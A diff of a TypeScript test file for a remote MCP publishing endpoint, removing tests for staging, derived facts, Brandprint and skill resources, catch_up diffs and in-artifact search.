@@ -1,7 +1,7 @@
 import { mkdtempSync, rmSync } from "node:fs"
 import { tmpdir } from "node:os"
 import { join } from "node:path"
-import type { BlobStore, MetaStore, SearchIndex, VersionRecord } from "@derive/core"
+import type { BlobStore, MetaStore, SearchIndex } from "@derive/core"
 import { SqliteMetaStore } from "@derive/db/sqlite"
 import { FsBlobStore } from "@derive/storage/fs"
 import Database from "better-sqlite3"
@@ -10,13 +10,7 @@ import { exportJWK, generateKeyPair, SignJWT } from "jose"
 import { afterAll, describe, expect, it } from "vitest"
 import { createApp } from "../src/app"
 import { sha256 } from "../src/lib/crypto"
-import {
-  MAX_INDEX_TEXT,
-  reindexSearchBatch,
-  searchMatcher,
-  searchWorkspace,
-  versionIndexText,
-} from "../src/lib/search"
+import { searchMatcher, searchWorkspace } from "../src/lib/search"
 import { PNG_BYTES } from "./fixtures"
 import { appWithGrant, call, type McpApp, type RpcOut, rpc, toolText } from "./mcp-helpers"
 
@@ -220,12 +214,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(new Uint8Array(await served.arrayBuffer())).toEqual(png)
   })
 
-  it("stage target:'asset' fails actionably when no signing secret is configured", async () => {
-    const { app, token } = appWithGrant(dir, "stagenosecret", "openid derive:read derive:publish")
-    const r = await call(app, token, "stage", { target: "asset" })
-    expect(toolText(r)).toContain("bearer token")
-  })
-
   it("stage target:'doc' mints a URL an anonymous shell can publish a whole file through", async () => {
     const { app, token, meta } = appWithGrant(
       dir,
@@ -319,25 +307,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(ok.short_id).toBeTruthy()
   })
 
-  it("stamps version.source='mcp' on tool publishes (the onboarding signal)", async () => {
-    const { app, token, meta } = appWithGrant(dir, "srcstamp", "openid derive:read derive:publish")
-    const created = JSON.parse(
-      toolText(await call(app, token, "publish", { title: "Stamped", content: "<h1>s</h1>" })),
-    )
-    const rec = await meta.getByShortId(created.short_id)
-    if (!rec) throw new Error("expected the published artifact")
-    expect((await meta.getVersion(rec.id, 1))?.source).toBe("mcp")
-  })
-
-  it("stage target:'doc' fails actionably when no signing secret is configured", async () => {
-    const { app, token } = appWithGrant(
-      dir,
-      "stagepubnosecret",
-      "openid derive:read derive:publish",
-    )
-    expect(toolText(await call(app, token, "stage", { target: "doc" }))).toContain("bearer token")
-  })
-
   it("stage target:'doc' revise mints a versions URL that publishes a new version", async () => {
     const { app, token, meta } = appWithGrant(
       dir,
@@ -373,35 +342,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     const up = await app.request(new URL(staged.upload_url).pathname, { method: "POST", body: fd })
     expect(up.status).toBe(201)
     expect((await up.json()).published).toBe(2)
-  })
-
-  it("stage requires a target (doc or asset) — never a silent default", async () => {
-    const { app, token } = appWithGrant(dir, "stagenotarget", "openid derive:read derive:publish", {
-      encryptionKey: "mcp-secret",
-    })
-    // `target` is a required enum on stage — omitting it is rejected at the schema, not
-    // silently defaulted to doc or asset.
-    const r = await call(app, token, "stage", {})
-    const result = r.parsed?.result as
-      | { isError?: boolean; content?: { text: string }[] }
-      | undefined
-    const errText = result?.content?.[0]?.text ?? JSON.stringify(r.parsed?.error ?? "")
-    expect(result?.isError === true || r.parsed?.error != null).toBe(true)
-    expect(errText.toLowerCase()).toContain("target")
-  })
-
-  it("publish rejects an oversized inline base64 data: URI, steering to stage target:'asset'", async () => {
-    const { app, token } = appWithGrant(dir, "pubbigb64", "openid derive:read derive:publish")
-    // A single base64 data: URI whose DECODED size clears the 32KB cap (base64 decodes
-    // ~3 bytes per 4 chars, so ~50k chars ≈ 37.5KB) is a binary pasted through the call.
-    const bigB64 = `data:image/png;base64,${"A".repeat(50_000)}`
-    const r = await call(app, token, "publish", {
-      title: "Bad Img",
-      content: `<img src="${bigB64}">`,
-    })
-    const out = r.parsed?.result as { isError?: boolean; content?: { text: string }[] } | undefined
-    expect(out?.isError).toBe(true)
-    expect(out?.content?.[0]?.text ?? "").toMatch(/stage target:.?asset/i)
   })
 
   it("publish rejects oversized inline content, steering to stage target:'doc'", async () => {
@@ -812,45 +752,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(after.some((r) => r.slot === "$stats")).toBe(true)
   })
 
-  it("stops serving a RETIRED deriver's rows, and collects them", async () => {
-    // Generations are per-deriver, read off the DERIVERS table. A `$name` the table no
-    // longer owns therefore has no generation, and the sentinel it gets back matches no
-    // stored row — so the orphan re-derives once, its prefix-scoped write drops it, and
-    // the read tells the truth about a name the host does not compute. Returning the
-    // column default instead would have served a retired deriver's output forever.
-    const { app, token, meta } = appWithGrant(dir, "retired", "openid derive:read derive:publish")
-    const page =
-      '<!doctype html><html><body><h1>Retired</h1><p>see <a href="/artifacts/other-doc-zz88yy77">that</a></p><h2>More</h2><p>x</p></body></html>'
-    const pub = JSON.parse(
-      toolText(await call(app, token, "publish", { title: "Retired", content: page })),
-    )
-    const rec = await meta.getByShortId(pub.short_id)
-    if (!rec) throw new Error("gone")
-    const live = await meta.getVersionData(rec.id, 1)
-    expect(live.map((r) => r.slot).sort()).toEqual(["$links", "$map", "$outline", "$stats"])
-    // Seed a row from a deriver that no longer exists, at the generation it shipped with.
-    await meta.setDerivedVersionData(rec.id, 1, [
-      ...live.map((r) => ({
-        id: r.id,
-        slot: r.slot,
-        json: r.json,
-        size_bytes: r.size_bytes,
-        gen: r.gen,
-      })),
-      { id: "vd_retired", slot: "$legacy", json: '{"old":true}', size_bytes: 12, gen: 1 },
-    ])
-    expect((await meta.getVersionData(rec.id, 1)).some((r) => r.slot === "$legacy")).toBe(true)
-
-    const miss = toolText(
-      await call(app, token, "read", { short_id: pub.short_id, data: "$legacy" }),
-    )
-    expect(miss).toContain("computed by the host")
-    expect(miss).not.toContain("old")
-    // The re-derivation swept the orphan and left the live rows intact.
-    const after = (await meta.getVersionData(rec.id, 1)).map((r) => r.slot).sort()
-    expect(after).toEqual(["$links", "$map", "$outline", "$stats"])
-  })
-
   it("a derived write can never delete an asserted row, whatever the interleaving", async () => {
     // The hazard this PR introduced and this test pins: lazy derivation is the SECOND
     // writer to an old version's rows, and backfillNewSlots is the first. Done as
@@ -895,116 +796,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     // above while quietly duplicating every derived row on each re-derivation.
     expect(after.filter((n) => n === "$stats")).toHaveLength(1)
     expect(new Set(after).size).toBe(after.length)
-  })
-
-  it("says WHY a fact is absent, instead of telling authors to do the impossible", async () => {
-    // Three absences, three different truths — all found by dogfooding the live preview,
-    // where every one of them read back as "embed a derive-facts block to add one".
-    const { app, token } = appWithGrant(dir, "absence", "openid derive:read derive:publish")
-
-    // (1) A BUNDLE whose page carries a real block. Extraction is single-file only, so the
-    // block is dropped — and the old message told this author to embed the block they
-    // just embedded. The publish must now SAY so, and the read must not misdirect.
-    const pub = JSON.parse(
-      toolText(
-        await call(app, token, "publish", {
-          title: "Bundle",
-          files: {
-            "index.html":
-              '<h1>B</h1><script type="application/derive-facts" data-fact="checks">{"pass":5}</script>',
-          },
-        }),
-      ),
-    )
-    expect(pub.note).toContain("index.html")
-    expect(pub.note).toContain("single-file")
-    const bundleMiss = toolText(
-      await call(app, token, "read", { short_id: pub.short_id, data: "checks" }),
-    )
-    expect(bundleMiss).toContain("carries no facts")
-    expect(bundleMiss).not.toContain("embed a derive-facts block to add one")
-
-    // (2) A DERIVED name nobody can embed: a one-heading page has no $outline, and the
-    // advice "embed a block" is impossible — $ is outside the author grammar.
-    const plain = JSON.parse(
-      toolText(
-        await call(app, token, "publish", { title: "Plain", content: "<h1>Only</h1><p>x</p>" }),
-      ),
-    )
-    const derivedMiss = toolText(
-      await call(app, token, "read", { short_id: plain.short_id, data: "$outline" }),
-    )
-    expect(derivedMiss).toContain("computed by the host")
-    expect(derivedMiss).not.toContain("embed a derive-facts block to add one")
-
-    // (3) The SERIES note over underived history: those versions did not "omit the block"
-    // — series reads never lazily fill, by design, so they are simply underived.
-    await call(app, token, "publish", { short_id: plain.short_id, content: "<h1>A</h1><h2>B</h2>" })
-    const series = JSON.parse(
-      toolText(
-        await call(app, token, "read", {
-          short_id: plain.short_id,
-          data: "$outline",
-          versions: "all",
-        }),
-      ),
-    )
-    if (series.note) {
-      expect(series.note).not.toContain("omitted the block")
-      expect(series.note).toContain("single-version read")
-    }
-  })
-
-  it("derived $rows in an older version never trigger the asserted backfill walk", async () => {
-    // The interplay the build doc ordered pinned (and the first commit CLAIMED was
-    // pinned without a test existing — this is that test). backfillNewSlots fires when a
-    // fact is new relative to the previous version's rows. Those rows now include $rows,
-    // and the walk must key on ASSERTED names only: a republish of an unchanged page
-    // must do no walk, because "checks" was already tracked, and the $rows beside it are
-    // not facts appearing for the first time.
-    const { app, token, meta } = appWithGrant(dir, "interplay", "openid derive:read derive:publish")
-    const page =
-      "<!doctype html><html><body><h1>A</h1><h2>B</h2>" +
-      '<script type="application/derive-facts" data-fact="checks">{"pass":1}</script>' +
-      "</body></html>"
-    const pub = JSON.parse(
-      toolText(await call(app, token, "publish", { title: "Interplay", content: page })),
-    )
-    const rec = await meta.getByShortId(pub.short_id)
-    if (!rec) throw new Error("gone")
-    // v1 has checks + $rows. Wipe v1's rows entirely, then publish v2: if the walk keyed
-    // on ALL previous rows it would see nothing tracked and re-walk; if it keyed on
-    // asserted names in the CURRENT parse minus previous rows, "checks" is fresh and the
-    // walk restores v1's checks — but must write NOTHING for $names into v1 (derived
-    // rows are lazy-only for old versions; the walk never pays derivation).
-    await meta.setVersionData(rec.id, 1, [])
-    await call(app, token, "publish", { short_id: pub.short_id, content: page })
-    const v1rows = await meta.getVersionData(rec.id, 1)
-    expect(v1rows.map((r) => r.slot)).toEqual(["checks"])
-  })
-
-  it("review deltas show the author's numbers moving, never the host's", async () => {
-    // catch_up's data_changes exists so a review round sees "checks.pass 9 -> 11" beside
-    // the prose diff. Between any two versions the derived $stats ALSO moved (the page
-    // grew), and reporting that would bury the author's delta under the host's noise.
-    const { app, token } = appWithGrant(dir, "deriveddeltas", "openid derive:read derive:publish")
-    const page = (pass: number, extra: string) =>
-      `<!doctype html><html><body><h1>R</h1><h2>S</h2><p>${extra}</p>` +
-      `<script type="application/derive-facts" data-fact="checks">{"pass":${pass}}</script>` +
-      "</body></html>"
-    const pub = JSON.parse(
-      toolText(await call(app, token, "publish", { title: "Deltas", content: page(9, "one") })),
-    )
-    await call(app, token, "publish", {
-      short_id: pub.short_id,
-      content: page(11, "one two three four five six grew a lot"),
-    })
-    const cu = JSON.parse(
-      toolText(await call(app, token, "catch_up", { short_id: pub.short_id, since_version: 1 })),
-    )
-    const changes = (cu.data_changes ?? []).join(" ")
-    expect(changes).toContain("checks.pass 9 → 11")
-    expect(changes).not.toContain("$stats")
   })
 
   it("extracts facts on publish and reads them back by name and as a list", async () => {
@@ -1103,61 +894,6 @@ describe("remote MCP endpoint (/mcp)", () => {
       ),
     )
     expect(tail.series.map((p: { n: number }) => p.n)).toEqual([3, 4])
-  })
-
-  it("reports coverage when versions in the range carry no slot, and rejects a bad range", async () => {
-    const { app, token } = appWithGrant(dir, "datacoverage", "openid derive:read derive:publish")
-    const withSlot =
-      '<!doctype html><html><body><script type="application/derive-data" data-slot="checks">{"pass":1}</script></body></html>'
-    const without = "<!doctype html><html><body><p>no slot</p></body></html>"
-    const created = JSON.parse(
-      toolText(await call(app, token, "publish", { title: "Sparse", content: withSlot })),
-    )
-    const shortId = created.short_id as string
-    await call(app, token, "publish", { short_id: shortId, content: without })
-
-    const series = JSON.parse(
-      toolText(
-        await call(app, token, "read", { short_id: shortId, data: "checks", versions: "all" }),
-      ),
-    )
-    // v1 has it, v2 does not — the response says so instead of pretending or inventing a gap.
-    expect(series.count).toBe(1)
-    expect(series.note).toContain('no "checks" slot')
-
-    // A malformed range names the real version count rather than returning nothing.
-    const bad = await call(app, token, "read", {
-      short_id: shortId,
-      data: "checks",
-      versions: "nope",
-    })
-    const badText =
-      (bad.parsed?.result as { content?: { text: string }[] }).content?.[0]?.text ?? ""
-    expect(badText).toContain("1..2")
-    // `versions` needs a named slot, not the "*" listing.
-    const star = await call(app, token, "read", { short_id: shortId, data: "*", versions: "all" })
-    const starText =
-      (star.parsed?.result as { content?: { text: string }[] }).content?.[0]?.text ?? ""
-    expect(starText).toContain("single slot")
-  })
-
-  it("advises about a facts it could not store, without failing the publish", async () => {
-    const { app, token } = appWithGrant(dir, "dataslotbad", "openid derive:read derive:publish")
-    const page =
-      '<!doctype html><html><body><script type="application/derive-data" data-slot="broken">{not json}</script></body></html>'
-    const r = await call(app, token, "publish", { title: "Broken slot", content: page })
-    const out = JSON.parse(toolText(r))
-    // The publish still went live...
-    expect(out.short_id).toBeTruthy()
-    // ...and the note names the unstored slot.
-    expect(String(out.note ?? "")).toMatch(/not valid JSON/i)
-    // Nothing was stored for it.
-    const listed = JSON.parse(
-      toolText(await call(app, token, "read", { short_id: out.short_id, data: "*" })),
-    )
-    // No ASSERTED facts stored — the derived $rows the host computed are marked and
-    // are not the author's.
-    expect(listed.facts.filter((s: { derived?: boolean }) => !s.derived)).toEqual([])
   })
 
   it("exposes accessible authored template libraries as resources without adding tools", async () => {
@@ -1350,180 +1086,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(text).toContain("How we write Markdown")
   })
 
-  it("delivers a Brandprint SKILL member with its own name/description, stripped body, and file footer", async () => {
-    const { app, token, meta } = appWithGrant(dir, "bpskill", "openid derive:read derive:publish")
-    // A real skill bundle: SKILL.md entry (no html ⇒ derive/skill) plus an aux script.
-    const created = JSON.parse(
-      toolText(
-        await call(app, token, "publish", {
-          title: "ignored — frontmatter name wins",
-          files: {
-            "SKILL.md":
-              "---\nname: chart-style\ndescription: How this workspace builds charts.\n---\n\n# Chart style\n\nUse the house palette and Space Grotesk.\n",
-            "scripts/build.sh": "#!/usr/bin/env bash\necho chart\n",
-          },
-        }),
-      ),
-    )
-    const art = await meta.getByShortId(created.short_id)
-    if (!art) throw new Error("no artifact")
-    expect(art.current_content_type).toBe("derive/skill")
-
-    const collectionId = "col_bp_skill"
-    await meta.createCollection({
-      id: collectionId,
-      org_id: art.org_id,
-      title: "Brandprint",
-      created_by: "u_o",
-    })
-    await meta.addCollectionItem(collectionId, art.id)
-    await meta.setOrgSettings(art.org_id, {
-      ...(await meta.getOrgSettings(art.org_id)),
-      brandprint: { collectionId },
-    })
-
-    // The resource descriptor carries the skill's OWN identity, not a generic label.
-    const listed = await rpc(app, token, { jsonrpc: "2.0", id: 3, method: "resources/list" })
-    const resource = (
-      (
-        listed.parsed?.result as {
-          resources?: { uri: string; title?: string; description?: string }[]
-        }
-      )?.resources ?? []
-    ).find((r) => r.uri === `derive://brandprint/${created.short_id}`)
-    expect(resource?.title).toBe("chart-style")
-    expect(resource?.description).toBe("How this workspace builds charts.")
-
-    // The body is the SKILL.md sans frontmatter, plus a footer pointing at the aux files.
-    const read = await rpc(app, token, {
-      jsonrpc: "2.0",
-      id: 4,
-      method: "resources/read",
-      params: { uri: `derive://brandprint/${created.short_id}` },
-    })
-    const body = (read.parsed?.result as { contents?: { text: string }[] } | undefined)
-      ?.contents?.[0]?.text
-    expect(body).toContain("# Chart style")
-    expect(body).toContain("Use the house palette")
-    expect(body).not.toContain("name: chart-style") // frontmatter stripped
-    expect(body).toContain("scripts/build.sh") // aux files announced
-  })
-
-  it("serves the build reference and a pending note while the profile is a stub", async () => {
-    const { app, token, meta } = appWithGrant(
-      dir,
-      "brandprint-pending",
-      "openid derive:read derive:publish",
-    )
-    const srcId = (await (await publish(app, token, "Voice and tone")).json()).short_id
-    const profId = (await (await publish(app, token, "Brand profile")).json()).short_id
-    const src = await meta.getByShortId(srcId)
-    const prof = await meta.getByShortId(profId)
-    if (!src || !prof) throw new Error("no artifacts")
-    const collectionId = "col_bp_pending"
-    await meta.createCollection({
-      id: collectionId,
-      org_id: src.org_id,
-      title: "Brandprint",
-      created_by: "u_o",
-    })
-    await meta.addCollectionItem(collectionId, src.id)
-    await meta.addCollectionItem(collectionId, prof.id)
-    await meta.setOrgSettings(src.org_id, {
-      ...(await meta.getOrgSettings(src.org_id)),
-      brandprint: { collectionId, profileId: profId },
-    })
-
-    // Factual, user-conditioned pending note — never a solicitation.
-    const init = await rpc(app, token, initBody)
-    const inst = (init.parsed?.result as { instructions?: string }).instructions ?? ""
-    expect(inst).toContain("has not been generated yet")
-    expect(inst).toContain("If the user asks")
-    expect(inst).toContain(profId)
-
-    // Reference + template are served; the stub is neither a source nor the profile.
-    const listed = await rpc(app, token, { jsonrpc: "2.0", id: 3, method: "resources/list" })
-    const uris = (
-      (listed.parsed?.result as { resources?: { uri: string }[] } | undefined)?.resources ?? []
-    ).map((r) => r.uri)
-    expect(uris).toContain("derive://brandprint/reference")
-    expect(uris).toContain("derive://brandprint/template")
-    expect(uris).toContain(`derive://brandprint/${srcId}`)
-    expect(uris).not.toContain("derive://brandprint/profile")
-    expect(uris).not.toContain(`derive://brandprint/${profId}`)
-
-    const ref = await rpc(app, token, {
-      jsonrpc: "2.0",
-      id: 4,
-      method: "resources/read",
-      params: { uri: "derive://brandprint/reference" },
-    })
-    const refText =
-      (ref.parsed?.result as { contents?: { text: string }[] } | undefined)?.contents?.[0]?.text ??
-      ""
-    expect(refText).toContain("opens a review")
-    expect(refText).toContain("brandprint-tokens")
-  })
-
-  it("serves the live profile as the headline resource once it has a real version", async () => {
-    const { app, token, meta } = appWithGrant(
-      dir,
-      "brandprint-live",
-      "openid derive:read derive:publish",
-    )
-    const profId = (await (await publish(app, token, "Brand profile")).json()).short_id
-    const prof = await meta.getByShortId(profId)
-    if (!prof) throw new Error("no artifact")
-    const collectionId = "col_bp_live"
-    await meta.createCollection({
-      id: collectionId,
-      org_id: prof.org_id,
-      title: "Brandprint",
-      created_by: "u_o",
-    })
-    await meta.addCollectionItem(collectionId, prof.id)
-    await meta.setOrgSettings(prof.org_id, {
-      ...(await meta.getOrgSettings(prof.org_id)),
-      brandprint: { collectionId, profileId: profId },
-    })
-
-    // The agent's generated profile lands as version 2 — the stub is v1, so v2 flips live.
-    const form = new FormData()
-    form.append(
-      "file",
-      new Blob([new TextEncoder().encode("<h1>Acme brand profile</h1>")]),
-      "index.html",
-    )
-    const rep = await app.request(`/v1/artifacts/${profId}/versions`, {
-      method: "POST",
-      body: form,
-      headers: { authorization: `Bearer ${token}` },
-    })
-    expect(rep.status).toBe(201)
-
-    const init = await rpc(app, token, initBody)
-    const inst = (init.parsed?.result as { instructions?: string }).instructions ?? ""
-    expect(inst).toContain("Brandprint profile")
-    expect(inst).toContain("derive://brandprint/profile")
-    expect(inst).not.toContain("has not been generated yet")
-
-    const listed = await rpc(app, token, { jsonrpc: "2.0", id: 3, method: "resources/list" })
-    const uris = (
-      (listed.parsed?.result as { resources?: { uri: string }[] } | undefined)?.resources ?? []
-    ).map((r) => r.uri)
-    expect(uris).toContain("derive://brandprint/profile")
-
-    const read = await rpc(app, token, {
-      jsonrpc: "2.0",
-      id: 4,
-      method: "resources/read",
-      params: { uri: "derive://brandprint/profile" },
-    })
-    const text = (read.parsed?.result as { contents?: { text: string }[] } | undefined)
-      ?.contents?.[0]?.text
-    expect(text).toContain("Acme brand profile")
-  })
-
   it("advertises resources + serves the build guide via `read` even with no Brandprint", async () => {
     // The bug this covers: reference/template were gated on an existing Brandprint, so a
     // session that connected first cached "no resources" for life. They now register
@@ -1555,65 +1117,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(
       toolText(await call(app, token, "read", { short_id: "derive://brandprint/profile" })),
     ).toContain("no live brand profile")
-  })
-
-  it("a caller whose personal toggle is off gets no workspace Brandprint resources, only their own", async () => {
-    const { app, token, meta } = appWithGrant(
-      dir,
-      "bp-toggle-off",
-      "openid derive:read derive:publish",
-    )
-    // The workspace has a Brandprint: a convention doc plus a brand profile.
-    const wsDocId = (await (await publish(app, token, "Workspace conventions")).json()).short_id
-    const profId = (await (await publish(app, token, "Brand profile")).json()).short_id
-    const wsDoc = await meta.getByShortId(wsDocId)
-    const prof = await meta.getByShortId(profId)
-    if (!wsDoc || !prof) throw new Error("no artifacts")
-    const wsCollectionId = "col_bp_toggle_ws"
-    await meta.createCollection({
-      id: wsCollectionId,
-      org_id: wsDoc.org_id,
-      title: "Brandprint",
-      created_by: "u_o",
-    })
-    await meta.addCollectionItem(wsCollectionId, wsDoc.id)
-    await meta.addCollectionItem(wsCollectionId, prof.id)
-    await meta.setOrgSettings(wsDoc.org_id, {
-      ...(await meta.getOrgSettings(wsDoc.org_id)),
-      brandprint: { collectionId: wsCollectionId, profileId: profId },
-    })
-
-    // The grant's owner (u_o) keeps their own personal collection but turns the
-    // workspace layer off: the same store-level shape /v1/me/profile persists,
-    // seeded directly since this app has no session auth wired up.
-    const personalDocId = (await (await publish(app, token, "My own conventions")).json()).short_id
-    const personalDoc = await meta.getByShortId(personalDocId)
-    if (!personalDoc) throw new Error("no artifact")
-    const personalCollectionId = "col_bp_toggle_personal"
-    await meta.createCollection({
-      id: personalCollectionId,
-      org_id: personalDoc.org_id,
-      title: "My Brandprint",
-      created_by: "u_o",
-    })
-    await meta.addCollectionItem(personalCollectionId, personalDoc.id)
-    await meta.setUserProfile("u_o", {
-      brandprint: JSON.stringify({
-        collectionId: personalCollectionId,
-        useWorkspaceBrandprint: false,
-      }),
-    })
-
-    const listed = await rpc(app, token, { jsonrpc: "2.0", id: 3, method: "resources/list" })
-    const uris = (
-      (listed.parsed?.result as { resources?: { uri: string }[] } | undefined)?.resources ?? []
-    ).map((r) => r.uri)
-    // No workspace doc, no profile: the toggle suppressed the workspace layer wholesale.
-    expect(uris).not.toContain(`derive://brandprint/${wsDocId}`)
-    expect(uris).not.toContain("derive://brandprint/profile")
-    expect(uris).not.toContain(`derive://brandprint/${profId}`)
-    // The personal collection's own doc still appears; it's the caller's own opt-in.
-    expect(uris).toContain(`derive://brandprint/${personalDocId}`)
   })
 
   it("publish to derive://brandprint/profile scaffolds the fact, is idempotent, and the loop goes live", async () => {
@@ -1795,36 +1298,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(await meta.collectionIdsForArtifact(artifact.id)).toEqual([])
   })
 
-  it("find (browse) marks skills and filters to them with skills:true", async () => {
-    const { app, token } = appWithGrant(dir, "listskills", "openid derive:read derive:publish")
-    const doc = (await (await publish(app, token, "A plain doc")).json()).short_id
-    const skill = JSON.parse(
-      toolText(
-        await call(app, token, "publish", {
-          title: "A skill",
-          files: {
-            "SKILL.md": "---\nname: my-skill\ndescription: does a thing.\n---\n\n# My skill\n",
-          },
-        }),
-      ),
-    ).short_id
-
-    // Unfiltered: both present; is_skill distinguishes them.
-    const all = JSON.parse(toolText(await call(app, token, "find")))
-    const rowOf = (id: string) =>
-      all.results.find((a: { short_id?: string }) => a.short_id === id) as
-        | { is_skill: boolean }
-        | undefined
-    expect(rowOf(skill)?.is_skill).toBe(true)
-    expect(rowOf(doc)?.is_skill).toBe(false)
-
-    // Filtered: only the skill.
-    const onlySkills = JSON.parse(toolText(await call(app, token, "find", { skills: true })))
-    const ids = onlySkills.results.map((a: { short_id?: string }) => a.short_id)
-    expect(ids).toContain(skill)
-    expect(ids).not.toContain(doc)
-  })
-
   it("the derive://skills catalog lists core and workspace skills; a short id reads one", async () => {
     const { app, token } = appWithGrant(dir, "skillcat", "openid derive:read derive:publish")
     const doc = (await (await publish(app, token, "Not a skill")).json()).short_id
@@ -1869,42 +1342,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     // Unknown refs still get the actionable error.
     const miss = toolText(await call(app, token, "read", { short_id: "derive://skills/zz99zz99" }))
     expect(miss).toContain("derive://skills")
-  })
-
-  it("plain read of a skill returns its SKILL.md body, not a bundle outline", async () => {
-    const { app, token } = appWithGrant(dir, "skillread", "openid derive:read derive:publish")
-    const skill = JSON.parse(
-      toolText(
-        await call(app, token, "publish", {
-          title: "Chart style",
-          files: {
-            "SKILL.md": "---\nname: chart-style\n---\n\n# Chart style\n\nInk on paper.\n",
-            "scripts/check.sh": "echo ok\n",
-          },
-        }),
-      ),
-    ).short_id
-    const r = JSON.parse(toolText(await call(app, token, "read", { short_id: skill })))
-    expect(JSON.stringify(r)).toContain("Ink on paper.")
-    expect(r.pages).toBeUndefined() // a skill reads as its document, not a file listing
-    expect(JSON.stringify(r)).toContain("scripts/check.sh") // but the files are named
-    // An explicit section still reads a single file the ordinary way.
-    const sec = toolText(
-      await call(app, token, "read", { short_id: skill, section: "scripts/check.sh" }),
-    )
-    expect(sec).toContain("echo ok")
-  })
-
-  it("instructions point at the skills catalog, with the workspace's count", async () => {
-    const { app, token } = appWithGrant(dir, "skillinstr", "openid derive:read derive:publish")
-    const before = (await rpc(app, token, initBody)).parsed?.result as { instructions?: string }
-    expect(before.instructions).toContain("derive://skills")
-    await call(app, token, "publish", {
-      title: "One skill",
-      files: { "SKILL.md": "---\nname: one\n---\n# One\n" },
-    })
-    const after = (await rpc(app, token, initBody)).parsed?.result as { instructions?: string }
-    expect(after.instructions).toMatch(/1 team skill/)
   })
 
   it("publish fires the version.published webhook — parity with the HTTP route", async () => {
@@ -2010,49 +1447,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(c.new_versions.map((v: { n: number }) => v.n)).toContain(2)
   })
 
-  it("catch_up detailed diffs the markdown conversion, not raw HTML tag noise", async () => {
-    const { app, token } = appWithGrant(dir, "catchupmd", "openid derive:read derive:publish")
-    const v1 =
-      "<html><head><style>body{color:red}</style></head><body>" +
-      "<h1>Doc</h1><p>alpha bravo charlie</p></body></html>"
-    const v2 =
-      "<html><head><style>body{color:blue}</style></head><body>" +
-      "<h1>Doc</h1><p>alpha BRAVO charlie</p></body></html>"
-    const form1 = new FormData()
-    form1.append("file", new Blob([new TextEncoder().encode(v1)]), "index.html")
-    form1.append("title", "Semantic")
-    const shortId = (
-      await (
-        await app.request("/v1/artifacts", {
-          method: "POST",
-          body: form1,
-          headers: { authorization: `Bearer ${token}` },
-        })
-      ).json()
-    ).short_id
-    const form2 = new FormData()
-    form2.append("file", new Blob([new TextEncoder().encode(v2)]), "index.html")
-    await app.request(`/v1/artifacts/${shortId}/versions`, {
-      method: "POST",
-      body: form2,
-      headers: { authorization: `Bearer ${token}` },
-    })
-    const cd = JSON.parse(
-      toolText(
-        await call(app, token, "catch_up", {
-          short_id: shortId,
-          since_version: 1,
-          to_version: 2,
-          response_format: "detailed",
-        }),
-      ),
-    )
-    expect(cd.entry_diff).toContain("diff of markdown conversion")
-    expect(cd.entry_diff).toContain("BRAVO")
-    expect(cd.entry_diff).not.toContain("<p")
-    expect(cd.entry_diff).not.toContain("color:")
-  })
-
   it("read + catch_up handle multi-page bundles", async () => {
     const { app, token } = appWithGrant(dir, "bundle", "openid derive:read derive:publish")
     const enc = (s: string) => new TextEncoder().encode(s)
@@ -2151,87 +1545,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     // No matches steers toward the text scope.
     const none = toolText(await call(app, token, "find", { short_id: id, query: "zzznothere" }))
     expect(none).toContain("no matches")
-  })
-
-  it("find (grep one artifact): source vs text scope on HTML, and bundles grouped by page", async () => {
-    const { app, token } = appWithGrant(dir, "search2", "openid derive:read derive:publish")
-    const html = "<h1>Heading</h1>\n<p>visible pricing text</p>"
-    const id = (await (await publishRaw(app, token, html, "page.html", "Page")).json()).short_id
-
-    // Source search sees the tags; text search sees only the visible words.
-    const inSource = toolText(await call(app, token, "find", { short_id: id, query: "h1" }))
-    expect(inSource).toContain("in source")
-    expect(inSource).toContain("<h1>Heading</h1>")
-    const inText = toolText(
-      await call(app, token, "find", { short_id: id, query: "h1", in: "text" }),
-    )
-    expect(inText).toContain("no matches")
-    const wordInText = toolText(
-      await call(app, token, "find", { short_id: id, query: "pricing", in: "text" }),
-    )
-    expect(wordInText).toContain("in text")
-    expect(wordInText).toContain("pricing")
-
-    // The steer names the format whose line numbers the results match, so the
-    // follow-up windowed read lands on the same coordinate space.
-    expect(inSource).toContain('read(lines:"from-to", format:"html")')
-    expect(wordInText).toContain('read(lines:"from-to", format:"text")')
-
-    // Bundle: matches across pages are grouped under each page path.
-    const enc = (s: string) => new TextEncoder().encode(s)
-    const form = new FormData()
-    form.append(
-      "file",
-      new Blob([
-        zipSync({
-          "index.html": enc("<h1>needle home</h1>"),
-          "about.html": enc("<p>needle about</p>"),
-        }),
-      ]),
-      "site.zip",
-    )
-    form.append("title", "Site")
-    form.append("visibility", "link")
-    const bundleId = (
-      await (
-        await app.request("/v1/artifacts", {
-          method: "POST",
-          body: form,
-          headers: { authorization: `Bearer ${token}` },
-        })
-      ).json()
-    ).short_id
-    const across = toolText(await call(app, token, "find", { short_id: bundleId, query: "needle" }))
-    expect(across).toContain("index.html")
-    expect(across).toContain("about.html")
-    expect(across).toContain("2 matches")
-  })
-
-  it("find (grep one artifact): matches are self-locating (§ section labels)", async () => {
-    const { app, token } = appWithGrant(dir, "srchsec", "openid derive:read derive:publish")
-    const md = [
-      "# Doc",
-      "",
-      "## Budget",
-      "spend is high",
-      "",
-      "## Risks",
-      "the churn risk is real",
-    ].join("\n")
-    const id = (await (await publishRaw(app, token, md, "plan.md", "Plan")).json()).short_id
-
-    // A term in each section is labelled with the heading it falls under.
-    const budget = toolText(await call(app, token, "find", { short_id: id, query: "spend" }))
-    expect(budget).toContain("§ Budget")
-    const risk = toolText(await call(app, token, "find", { short_id: id, query: "churn" }))
-    expect(risk).toContain("§ Risks")
-
-    // On HTML, a nested labelled landmark is the section (not just top-level).
-    const html =
-      "<body>\n<main>\n<section aria-label='Revenue'>the pricing tier</section>\n</main>\n</body>"
-    const hid = (await (await publishRaw(app, token, html, "d.html", "D")).json()).short_id
-    const s = toolText(await call(app, token, "find", { short_id: hid, query: "pricing" }))
-    expect(s).toContain("§ Revenue")
   })
 
